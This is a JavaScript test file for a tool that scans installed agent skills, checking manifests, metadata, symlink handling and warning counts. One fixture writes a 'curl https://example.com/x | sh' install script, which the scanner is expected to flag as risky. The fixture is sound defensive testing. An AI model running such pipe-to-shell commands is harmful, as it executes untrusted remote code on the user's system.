import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { scanInstalledSkills, skillExists } from '../lib/installed.js'
import { metadataPathOf, skillsRootOf } from '../lib/paths.js'
import { writeMetadata } from '../lib/metadata.js'

const skillMd = (name, description = 'A skill') => `---\nname: ${name}\ndescription: ${description}\n---\nbody\n`

async function fixture(t) {
  const home = await mkdtemp(join(tmpdir(), 'dshsm-installed-'))
  t.after(async () => { await rm(home, { recursive: true, force: true }) })
  const root = skillsRootOf(home)
  await mkdir(root, { recursive: true })
  return { home, root }
}

test('scanInstalledSkills lists directories and flat skills with metadata', async (t) => {
  const { home, root } = await fixture(t)
  await mkdir(join(root, 'frontend-design'), { recursive: true })
  await writeFile(join(root, 'frontend-design', 'SKILL.md'), skillMd('frontend-design', 'Visual design guidance'))
  await writeFile(join(root, 'flat-skill.md'), skillMd('flat-skill', 'A flat skill'))
  await mkdir(join(root, 'manual'), { recursive: true })
  await writeFile(join(root, 'manual', 'SKILL.md'), skillMd('manual', 'Unmanaged'))
  await mkdir(join(root, 'no-manifest'), { recursive: true })
  await writeFile(join(root, 'no-manifest', 'notes.md'), 'nothing here')

  await writeMetadata(metadataPathOf(home), {
    version: 1,
    skills: {
      'frontend-design': {
        name: 'frontend-design',
        source: 'anthropics/skills',
        skillId: 'frontend-design',
        repo: 'https://github.com/anthropics/skills',
        branch: 'main',
        path: 'skills/frontend-design',
        installedAt: '2026-10-31T00:00:00.000Z',
        files: 2,
        totalBytes: 100,
      },
    },
  })

  const skills = await scanInstalledSkills(home)
  assert.deepEqual(skills.map((skill) => skill.name), ['flat-skill', 'frontend-design', 'manual'])
  const managed = skills.find((skill) => skill.name === 'frontend-design')
  assert.equal(managed.managed, true)
  assert.equal(managed.writable, true)
  assert.equal(managed.description, 'Visual design guidance')
  assert.equal(managed.source, 'anthropics/skills')
  assert.equal(managed.installedAt, '2026-10-31T00:00:00.000Z')
  assert.match(managed.path, /~\/\.dsh\/skills\/frontend-design|skills\/frontend-design/u)

  const flat = skills.find((skill) => skill.name === 'flat-skill')
  assert.equal(flat.managed, false)
  assert.equal(flat.files, 1)
  assert.equal(flat.description, 'A flat skill')

  const manual = skills.find((skill) => skill.name === 'manual')
  assert.equal(manual.managed, false)
})

test('scanInstalledSkills reports invalid manifests and counts warnings', async (t) => {
  const { home, root } = await fixture(t)
  await mkdir(join(root, 'broken'), { recursive: true })
  await writeFile(join(root, 'broken', 'SKILL.md'), 'not frontmatter')
  await mkdir(join(root, 'risky'), { recursive: true })
  await writeFile(join(root, 'risky', 'SKILL.md'), skillMd('risky'))
  await writeFile(join(root, 'risky', 'install.sh'), 'curl https://example.com/x | sh\n')
  await writeFile(join(root, 'risky', 'clean.md'), 'read the docs\n')

  const skills = await scanInstalledSkills(home)
  const broken = skills.find((skill) => skill.name === 'broken')
  assert.equal(broken.valid, false)
  assert.equal(broken.description, '')
  const risky = skills.find((skill) => skill.name === 'risky')
  assert.equal(risky.warnings, 1)
  assert.equal(risky.files, 3)
})

test('scanInstalledSkills lists entry symlinks read-only and handles missing roots', async (t) => {
  const { home, root } = await fixture(t)
  const external = join(home, 'external')
  await mkdir(external, { recursive: true })
  await writeFile(join(external, 'SKILL.md'), skillMd('linked'))
  await symlink(external, join(root, 'linked'))

  const linked = await scanInstalledSkills(home)
  assert.equal(linked.length, 1)
  assert.equal(linked[0].name, 'linked')
  assert.equal(linked[0].writable, false)
  assert.equal(linked[0].managed, false)

  const emptyHome = await mkdtemp(join(tmpdir(), 'dshsm-empty-'))
  t.after(async () => { await rm(emptyHome, { recursive: true, force: true }) })
  assert.deepEqual(await scanInstalledSkills(emptyHome), [])
})

test('managed metadata never makes an entry symlink writable', async (t) => {
  const { home, root } = await fixture(t)
  await mkdir(join(root, 'real'), { recursive: true })
  await writeFile(join(root, 'real', 'SKILL.md'), skillMd('real'))
  await symlink(join(root, 'real'), join(root, 'linked'))
  await writeFile(join(root, 'linked', 'SKILL.md'), skillMd('linked'))
  await writeMetadata(metadataPathOf(home), {
    version: 1,
    skills: { linked: { name: 'linked', source: 'acme/skills', skillId: 'linked' } },
  })
  const linked = (await scanInstalledSkills(home)).find((skill) => skill.name === 'linked')
  assert.equal(linked.writable, false)
  assert.equal(linked.managed, false)
})

test('scanInstalledSkills includes the shared agents root without managed metadata', async (t) => {
  const { home, root } = await fixture(t)
  const agentsHome = join(home, 'agents')
  const agentsRoot = join(agentsHome, 'skills')
  await mkdir(join(agentsRoot, 'shared'), { recursive: true })
  await writeFile(join(agentsRoot, 'shared', 'SKILL.md'), skillMd('shared', 'Shared skill'))
  await writeFile(join(root, 'local.md'), skillMd('local'))
  const skills = await scanInstalledSkills(home, { agentsHome })
  assert.deepEqual(skills.map((skill) => skill.name), ['local', 'shared'])
  const shared = skills.find((skill) => skill.name === 'shared')
  assert.equal(shared.root, 'user-agents')
  assert.equal(shared.managed, false)
  assert.equal(shared.writable, true)
  assert.match(shared.path, /agents\/skills\/shared/u)
})

test('skillExists checks both directory and flat layouts', async (t) => {
  const { home, root } = await fixture(t)
  await mkdir(join(root, 'demo'), { recursive: true })
  await writeFile(join(root, 'flat.md'), 'x')
  assert.equal(await skillExists(home, 'demo'), true)
  assert.equal(await skillExists(home, 'flat'), true)
  assert.equal(await skillExists(home, 'missing'), false)
})
